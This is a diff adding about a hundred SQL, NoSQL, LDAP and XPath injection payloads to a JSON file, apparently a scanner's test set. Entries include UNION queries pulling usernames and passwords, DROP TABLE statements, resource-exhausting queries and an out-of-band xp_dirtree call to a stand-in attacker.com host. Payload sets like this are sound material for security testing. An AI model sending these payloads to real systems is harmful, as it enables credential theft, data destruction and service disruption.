@@ -1,4 +1,5 @@
-{
+[
+  {
     "name": "Boolean-Based SQLi",
     "description": "Detect SQL injection using boolean logic",
     "method": "GET",
@@ -9,4 +10,1669 @@
     "parameters": {
       "id": "1' OR '1'='1'--"
     }
+  },
+  {
+    "name": "Time-Based Blind SQLi",
+    "description": "Time delay based SQL injection",
+    "method": "GET",
+    "endpoint": "/api/user",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; WAITFOR DELAY '00:00:05'--"
+    }
+  },
+  {
+    "name": "Union-Based SQLi",
+    "description": "Union query SQL injection",
+    "method": "GET",
+    "endpoint": "/api/products",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "category": "1' UNION SELECT username, password FROM users--"
+    }
+  },
+  {
+    "name": "Error-Based SQLi",
+    "description": "Extract information through error messages",
+    "method": "GET",
+    "endpoint": "/api/info",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--"
+    }
+  },
+  {
+    "name": "Out-of-Band SQLi",
+    "description": "Exfiltrate data via DNS or HTTP requests",
+    "method": "GET",
+    "endpoint": "/api/data",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; EXEC xp_dirtree '\\\\attacker.com\\share'--"
+    }
+  },
+  {
+    "name": "Stacked Queries SQLi",
+    "description": "Execute multiple SQL statements",
+    "method": "POST",
+    "endpoint": "/api/update",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; DROP TABLE users;--"
+    }
+  },
+  {
+    "name": "Second-Order SQLi",
+    "description": "Stored SQL injection attack",
+    "method": "POST",
+    "endpoint": "/api/register",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "username": "admin'--",
+      "email": "test@example.com"
+    }
+  },
+  {
+    "name": "Content-Based Blind SQLi",
+    "description": "Blind injection based on content differences",
+    "method": "GET",
+    "endpoint": "/api/profile",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "user": "1' AND (SELECT COUNT(*) FROM users) > 0--"
+    }
+  },
+  {
+    "name": "Double Query SQLi",
+    "description": "Nested query injection",
+    "method": "GET",
+    "endpoint": "/api/search",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "q": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+    }
+  },
+  {
+    "name": "Hex-Encoded SQLi",
+    "description": "Hexadecimal encoded injection",
+    "method": "GET",
+    "endpoint": "/api/data",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "0x3127204f52202731273d2731272d2d"
+    }
+  },
+  {
+    "name": "Base64 SQLi",
+    "description": "Base64 encoded injection",
+    "method": "GET",
+    "endpoint": "/api/decode",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "data": "MScgT1IgJzEnPScxJy0t"
+    }
+  },
+  {
+    "name": "JSON SQLi",
+    "description": "SQL injection in JSON parameters",
+    "method": "POST",
+    "endpoint": "/api/json",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "user": {
+        "id": "1' OR '1'='1'--"
+      }
+    }
+  },
+  {
+    "name": "XML SQLi",
+    "description": "SQL injection in XML data",
+    "method": "POST",
+    "endpoint": "/api/xml",
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<user><id>1' OR '1'='1'--</id></user>"
+  },
+  {
+    "name": "Cookie-Based SQLi",
+    "description": "SQL injection via cookies",
+    "method": "GET",
+    "endpoint": "/api/session",
+    "headers": {
+      "Content-Type": "application/json",
+      "Cookie": "session=1' OR '1'='1'--"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "User-Agent SQLi",
+    "description": "SQL injection via User-Agent header",
+    "method": "GET",
+    "endpoint": "/api/log",
+    "headers": {
+      "Content-Type": "application/json",
+      "User-Agent": "1' OR '1'='1'--"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "Referer SQLi",
+    "description": "SQL injection via Referer header",
+    "method": "GET",
+    "endpoint": "/api/track",
+    "headers": {
+      "Content-Type": "application/json",
+      "Referer": "http://example.com/1' OR '1'='1'--"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "HTTP Header SQLi",
+    "description": "SQL injection via custom headers",
+    "method": "GET",
+    "endpoint": "/api/auth",
+    "headers": {
+      "Content-Type": "application/json",
+      "X-User-ID": "1' OR '1'='1'--"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "POST Body SQLi",
+    "description": "SQL injection in POST request body",
+    "method": "POST",
+    "endpoint": "/api/login",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "body": "username=admin'--&password=any"
+  },
+  {
+    "name": "GET Parameter SQLi",
+    "description": "SQL injection in URL parameters",
+    "method": "GET",
+    "endpoint": "/api/search?q=1' OR '1'='1'--",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {}
+  },
+  {
+    "name": "Batch SQLi",
+    "description": "Batch query injection",
+    "method": "POST",
+    "endpoint": "/api/batch",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "query": "SELECT * FROM users; DROP TABLE logs--"
+    }
+  },
+  {
+    "name": "MySQL Comment SQLi",
+    "description": "MySQL specific comment injection",
+    "method": "GET",
+    "endpoint": "/api/mysql",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'/*! OR*/'1'='1'--"
+    }
+  },
+  {
+    "name": "MSSQL SQLi",
+    "description": "Microsoft SQL Server specific injection",
+    "method": "GET",
+    "endpoint": "/api/mssql",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; EXEC sp_configure 'show advanced options', 1--"
+    }
+  },
+  {
+    "name": "Oracle SQLi",
+    "description": "Oracle database specific injection",
+    "method": "GET",
+    "endpoint": "/api/oracle",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT NULL FROM dual--"
+    }
+  },
+  {
+    "name": "PostgreSQL SQLi",
+    "description": "PostgreSQL specific injection",
+    "method": "GET",
+    "endpoint": "/api/pgsql",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT pg_sleep(5)--"
+    }
+  },
+  {
+    "name": "SQLite SQLi",
+    "description": "SQLite specific injection",
+    "method": "GET",
+    "endpoint": "/api/sqlite",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND load_extension('test.dll')--"
+    }
+  },
+  {
+    "name": "NoSQL Injection",
+    "description": "NoSQL database injection",
+    "method": "POST",
+    "endpoint": "/api/nosql",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": {
+      "username": {
+        "$ne": null
+      },
+      "password": {
+        "$ne": null
+      }
+    }
+  },
+  {
+    "name": "LDAP Injection",
+    "description": "LDAP query injection",
+    "method": "POST",
+    "endpoint": "/api/ldap",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "username": "*)(uid=*))(|(uid=*"
+    }
+  },
+  {
+    "name": "XPath Injection",
+    "description": "XPath query injection",
+    "method": "POST",
+    "endpoint": "/api/xpath",
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<query>//user[username='admin' or '1'='1']</query>"
+  },
+  {
+    "name": "Boolean Blind with CASE",
+    "description": "Boolean blind using CASE statements",
+    "method": "GET",
+    "endpoint": "/api/case",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1--"
+    }
+  },
+  {
+    "name": "Time-Based with BENCHMARK",
+    "description": "Time-based using BENCHMARK function",
+    "method": "GET",
+    "endpoint": "/api/benchmark",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND BENCHMARK(5000000, MD5('test'))--"
+    }
+  },
+  {
+    "name": "Error-Based with UpdateXML",
+    "description": "Error-based using UpdateXML function",
+    "method": "GET",
+    "endpoint": "/api/updatexml",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND UpdateXML(1, CONCAT(0x7e, (SELECT @@version)), 1)--"
+    }
+  },
+  {
+    "name": "Union with ORDER BY",
+    "description": "Union injection with ORDER BY",
+    "method": "GET",
+    "endpoint": "/api/order",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "sort": "1' UNION SELECT 1,2 ORDER BY 3--"
+    }
+  },
+  {
+    "name": "Boolean with LIKE",
+    "description": "Boolean injection using LIKE operator",
+    "method": "GET",
+    "endpoint": "/api/like",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "search": "admin' OR username LIKE '%admin%'--"
+    }
+  },
+  {
+    "name": "Time-Based with SLEEP",
+    "description": "Time-based using SLEEP function",
+    "method": "GET",
+    "endpoint": "/api/sleep",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT SLEEP(5)--"
+    }
+  },
+  {
+    "name": "Error-Based with ExtractValue",
+    "description": "Error-based using ExtractValue function",
+    "method": "GET",
+    "endpoint": "/api/extract",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ExtractValue(1, CONCAT(0x7e, (SELECT USER())))--"
+    }
+  },
+  {
+    "name": "Union with GROUP BY",
+    "description": "Union injection with GROUP BY",
+    "method": "GET",
+    "endpoint": "/api/group",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "category": "1' UNION SELECT 1,2 GROUP BY 3--"
+    }
+  },
+  {
+    "name": "Boolean with IF",
+    "description": "Boolean injection using IF function",
+    "method": "GET",
+    "endpoint": "/api/if",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND IF(1=1, 1, 0)=1--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy query",
+    "description": "Time-based using heavy computational query",
+    "method": "GET",
+    "endpoint": "/api/heavy",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT COUNT(*) FROM information_schema.columns a, information_schema.columns b, information_schema.columns c--"
+    }
+  },
+  {
+    "name": "Error-Based with GeometryCollection",
+    "description": "Error-based using GeometryCollection function",
+    "method": "GET",
+    "endpoint": "/api/geometry",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND GeometryCollection((SELECT * FROM (SELECT * FROM (SELECT @@version) f) g))--"
+    }
+  },
+  {
+    "name": "Union with JOIN",
+    "description": "Union injection with JOIN",
+    "method": "GET",
+    "endpoint": "/api/join",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT * FROM users JOIN posts ON users.id=posts.user_id--"
+    }
+  },
+  {
+    "name": "Boolean with BETWEEN",
+    "description": "Boolean injection using BETWEEN operator",
+    "method": "GET",
+    "endpoint": "/api/between",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' OR id BETWEEN 1 AND 100--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy function",
+    "description": "Time-based using heavy mathematical function",
+    "method": "GET",
+    "endpoint": "/api/math",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT EXP(1000000)--"
+    }
+  },
+  {
+    "name": "Error-Based with Polygon",
+    "description": "Error-based using Polygon function",
+    "method": "GET",
+    "endpoint": "/api/polygon",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND Polygon((SELECT * FROM (SELECT * FROM (SELECT @@version) f) g))--"
+    }
+  },
+  {
+    "name": "Union with subquery",
+    "description": "Union injection with subquery",
+    "method": "GET",
+    "endpoint": "/api/subquery",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT (SELECT username FROM users WHERE id=1),2--"
+    }
+  },
+  {
+    "name": "Boolean with IN",
+    "description": "Boolean injection using IN operator",
+    "method": "GET",
+    "endpoint": "/api/in",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' OR id IN (SELECT id FROM users)--"
+    }
+  },
+  {
+    "name": "Time-Based with recursive CTE",
+    "description": "Time-based using recursive Common Table Expression",
+    "method": "GET",
+    "endpoint": "/api/recursive",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM r) SELECT * FROM r LIMIT 1000000--"
+    }
+  },
+  {
+    "name": "Error-Based with MultiPoint",
+    "description": "Error-based using MultiPoint function",
+    "method": "GET",
+    "endpoint": "/api/multipoint",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND MultiPoint((SELECT * FROM (SELECT * FROM (SELECT @@version) f) g))--"
+    }
+  },
+  {
+    "name": "Union with LIMIT",
+    "description": "Union injection with LIMIT clause",
+    "method": "GET",
+    "endpoint": "/api/limit",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT username, password FROM users LIMIT 1--"
+    }
+  },
+  {
+    "name": "Boolean with EXISTS",
+    "description": "Boolean injection using EXISTS operator",
+    "method": "GET",
+    "endpoint": "/api/exists",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND EXISTS (SELECT * FROM users WHERE username='admin')--"
+    }
+  },
+  {
+    "name": "Time-Based with generate_series",
+    "description": "Time-based using generate_series function",
+    "method": "GET",
+    "endpoint": "/api/generate",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT * FROM generate_series(1,1000000)--"
+    }
+  },
+  {
+    "name": "Error-Based with LineString",
+    "description": "Error-based using LineString function",
+    "method": "GET",
+    "endpoint": "/api/linestring",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND LineString((SELECT * FROM (SELECT * FROM (SELECT @@version) f) g))--"
+    }
+  },
+  {
+    "name": "Union with OFFSET",
+    "description": "Union injection with OFFSET clause",
+    "method": "GET",
+    "endpoint": "/api/offset",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT username, password FROM users LIMIT 1 OFFSET 0--"
+    }
+  },
+  {
+    "name": "Boolean with ALL",
+    "description": "Boolean injection using ALL operator",
+    "method": "GET",
+    "endpoint": "/api/all",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND id > ALL (SELECT id FROM users)--"
+    }
+  },
+  {
+    "name": "Time-Based with pg_sleep",
+    "description": "Time-based using pg_sleep function",
+    "method": "GET",
+    "endpoint": "/api/pgsleep",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT pg_sleep(5)--"
+    }
+  },
+  {
+    "name": "Error-Based with MultiLineString",
+    "description": "Error-based using MultiLineString function",
+    "method": "GET",
+    "endpoint": "/api/multilinestring",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND MultiLineString((SELECT * FROM (SELECT * FROM (SELECT @@version) f) g))--"
+    }
+  },
+  {
+    "name": "Union with WHERE",
+    "description": "Union injection with WHERE clause",
+    "method": "GET",
+    "endpoint": "/api/where",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT username, password FROM users WHERE id=1--"
+    }
+  },
+  {
+    "name": "Boolean with ANY",
+    "description": "Boolean injection using ANY operator",
+    "method": "GET",
+    "endpoint": "/api/any",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND id = ANY (SELECT id FROM users)--"
+    }
+  },
+  {
+    "name": "Time-Based with dbms_pipe.receive_message",
+    "description": "Time-based using dbms_pipe.receive_message function",
+    "method": "GET",
+    "endpoint": "/api/dbmspipe",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--"
+    }
+  },
+  {
+    "name": "Error-Based with MultiPolygon",
+    "description": "Error-based using MultiPolygon function",
+    "method": "GET",
+    "endpoint": "/api/multipolygon",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND MultiPolygon((SELECT * FROM (SELECT * FROM (SELECT @@version) f) g))--"
+    }
+  },
+  {
+    "name": "Union with HAVING",
+    "description": "Union injection with HAVING clause",
+    "method": "GET",
+    "endpoint": "/api/having",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT 1,2 HAVING 1=1--"
+    }
+  },
+  {
+    "name": "Boolean with SOME",
+    "description": "Boolean injection using SOME operator",
+    "method": "GET",
+    "endpoint": "/api/some",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND id = SOME (SELECT id FROM users)--"
+    }
+  },
+  {
+    "name": "Time-Based with utl_inaddr.get_host_address",
+    "description": "Time-based using utl_inaddr.get_host_address function",
+    "method": "GET",
+    "endpoint": "/api/utl",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND (SELECT COUNT(*) FROM all_objects) = (SELECT COUNT(*) FROM all_objects WHERE ROWNUM <= 1000) AND utl_inaddr.get_host_address('10.0.0.1') is not null--"
+    }
+  },
+  {
+    "name": "Error-Based with GeomCollection",
+    "description": "Error-based using GeomCollection function",
+    "method": "GET",
+    "endpoint": "/api/geomcollection",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND GeomCollection((SELECT * FROM (SELECT * FROM (SELECT @@version) f) g))--"
+    }
+  },
+  {
+    "name": "Union with DISTINCT",
+    "description": "Union injection with DISTINCT clause",
+    "method": "GET",
+    "endpoint": "/api/distinct",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT DISTINCT username, password FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with NOT",
+    "description": "Boolean injection using NOT operator",
+    "method": "GET",
+    "endpoint": "/api/not",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND NOT (id = 0)--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy aggregation",
+    "description": "Time-based using heavy aggregation query",
+    "method": "GET",
+    "endpoint": "/api/aggregate",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT SUM(LENGTH(column_name)) FROM information_schema.columns--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_LatFromGeoHash",
+    "description": "Error-based using ST_LatFromGeoHash function",
+    "method": "GET",
+    "endpoint": "/api/geohash",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_LatFromGeoHash((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables))--"
+    }
+  },
+  {
+    "name": "Union with AS",
+    "description": "Union injection with AS alias",
+    "method": "GET",
+    "endpoint": "/api/alias",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT username AS user, password AS pass FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with IS NULL",
+    "description": "Boolean injection using IS NULL operator",
+    "method": "GET",
+    "endpoint": "/api/isnull",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' OR description IS NULL--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy string manipulation",
+    "description": "Time-based using heavy string manipulation",
+    "method": "GET",
+    "endpoint": "/api/string",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT REPEAT('a', 1000000)--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_LongFromGeoHash",
+    "description": "Error-based using ST_LongFromGeoHash function",
+    "method": "GET",
+    "endpoint": "/api/geohash2",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_LongFromGeoHash((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns))--"
+    }
+  },
+  {
+    "name": "Union with CAST",
+    "description": "Union injection with CAST function",
+    "method": "GET",
+    "endpoint": "/api/cast",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT CAST(username AS CHAR), CAST(password AS CHAR) FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with IS NOT NULL",
+    "description": "Boolean injection using IS NOT NULL operator",
+    "method": "GET",
+    "endpoint": "/api/isnotnull",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND username IS NOT NULL--"
+    }
+  },
+  {
+    "name": "Time-Based with recursive function",
+    "description": "Time-based using recursive function call",
+    "method": "GET",
+    "endpoint": "/api/recursivefunc",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; WITH RECURSIVE factorial(n, fact) AS (SELECT 1, 1 UNION ALL SELECT n+1, (n+1)*fact FROM factorial WHERE n < 10000) SELECT * FROM factorial--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_PointFromGeoHash",
+    "description": "Error-based using ST_PointFromGeoHash function",
+    "method": "GET",
+    "endpoint": "/api/geohash3",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_PointFromGeoHash((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata))--"
+    }
+  },
+  {
+    "name": "Union with CONVERT",
+    "description": "Union injection with CONVERT function",
+    "method": "GET",
+    "endpoint": "/api/convert",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT CONVERT(username USING utf8), CONVERT(password USING utf8) FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with COALESCE",
+    "description": "Boolean injection using COALESCE function",
+    "method": "GET",
+    "endpoint": "/api/coalesce",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' OR COALESCE(username, '') != ''--"
+    }
+  },
+  {
+    "name": "Time-Based with cross join",
+    "description": "Time-based using cross join of large tables",
+    "method": "GET",
+    "endpoint": "/api/crossjoin",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT * FROM information_schema.columns a CROSS JOIN information_schema.tables b--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_GeoHash",
+    "description": "Error-based using ST_GeoHash function",
+    "method": "GET",
+    "endpoint": "/api/geohash4",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_GeoHash((SELECT GROUP_CONCAT(engine) FROM information_schema.engines))--"
+    }
+  },
+  {
+    "name": "Union with CONCAT",
+    "description": "Union injection with CONCAT function",
+    "method": "GET",
+    "endpoint": "/api/concat",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT CONCAT(username, ':', password), NULL FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with NULLIF",
+    "description": "Boolean injection using NULLIF function",
+    "method": "GET",
+    "endpoint": "/api/nullif",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND NULLIF(username, '') IS NOT NULL--"
+    }
+  },
+  {
+    "name": "Time-Based with large result set",
+    "description": "Time-based by returning large result set",
+    "method": "GET",
+    "endpoint": "/api/large",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT * FROM information_schema.columns, information_schema.tables--"
+    }
+  },
+  {
+    "name": "Boolean with GREATEST",
+    "description": "Boolean injection using GREATEST function",
+    "method": "GET",
+    "endpoint": "/api/greatest",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND GREATEST(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)), 1)=97--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy cryptographic function",
+    "description": "Time-based using computationally expensive cryptographic hashing",
+    "method": "GET",
+    "endpoint": "/api/crypto",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT SHA2('test', 512) FROM information_schema.tables t1, information_schema.tables t2--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_AsGeoJSON",
+    "description": "Error-based using ST_AsGeoJSON function",
+    "method": "GET",
+    "endpoint": "/api/geojson",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_AsGeoJSON((SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges))--"
+    }
+  },
+  {
+    "name": "Union with IFNULL",
+    "description": "Union injection with IFNULL function",
+    "method": "GET",
+    "endpoint": "/api/ifnull",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT IFNULL(username, ''), IFNULL(password, '') FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with LEAST",
+    "description": "Boolean injection using LEAST function",
+    "method": "GET",
+    "endpoint": "/api/least",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND LEAST(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)), 255)=97--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy random generation",
+    "description": "Time-based using heavy random number generation",
+    "method": "GET",
+    "endpoint": "/api/random",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT RAND() FROM information_schema.tables t1, information_schema.tables t2, information_schema.tables t3--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_AsGML",
+    "description": "Error-based using ST_AsGML function",
+    "method": "GET",
+    "endpoint": "/api/gml",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_AsGML((SELECT GROUP_CONCAT(grantee) FROM information_schema.schema_privileges))--"
+    }
+  },
+  {
+    "name": "Union with ISNULL",
+    "description": "Union injection with ISNULL function",
+    "method": "GET",
+    "endpoint": "/api/isnullfunc",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT ISNULL(username, ''), ISNULL(password, '') FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with ASCII substring brute force",
+    "description": "Boolean injection using ASCII and SUBSTRING for brute force",
+    "method": "GET",
+    "endpoint": "/api/asciibrute",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) = 97--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy XML processing",
+    "description": "Time-based using heavy XML parsing and processing",
+    "method": "GET",
+    "endpoint": "/api/xmlprocess",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT ExtractValue(XMLType('<a>'||(SELECT table_name FROM user_tables WHERE rownum=1)||'</a>'), '/a') FROM dual--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_AsKML",
+    "description": "Error-based using ST_AsKML function",
+    "method": "GET",
+    "endpoint": "/api/kml",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_AsKML((SELECT GROUP_CONCAT(routine_name) FROM information_schema.routines))--"
+    }
+  },
+  {
+    "name": "Union with NVL",
+    "description": "Union injection with NVL function (Oracle)",
+    "method": "GET",
+    "endpoint": "/api/nvl",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT NVL(username, ''), NVL(password, '') FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with BIT_COUNT",
+    "description": "Boolean injection using BIT_COUNT function",
+    "method": "GET",
+    "endpoint": "/api/bitcount",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND BIT_COUNT(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))) > 0--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy JSON processing",
+    "description": "Time-based using heavy JSON parsing and processing",
+    "method": "GET",
+    "endpoint": "/api/jsonprocess",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT JSON_EXTRACT('{\"a\":\"'||(SELECT password FROM users WHERE id=1)||'\"}', '$.a')--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_AsSVG",
+    "description": "Error-based using ST_AsSVG function",
+    "method": "GET",
+    "endpoint": "/api/svg",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_AsSVG((SELECT GROUP_CONCAT(event_name) FROM information_schema.events))--"
+    }
+  },
+  {
+    "name": "Union with COALESCE in SELECT",
+    "description": "Union injection with COALESCE function in SELECT",
+    "method": "GET",
+    "endpoint": "/api/coalesceselect",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT COALESCE(username, 'unknown'), COALESCE(password, '') FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with CHAR_LENGTH",
+    "description": "Boolean injection using CHAR_LENGTH function",
+    "method": "GET",
+    "endpoint": "/api/charlength",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
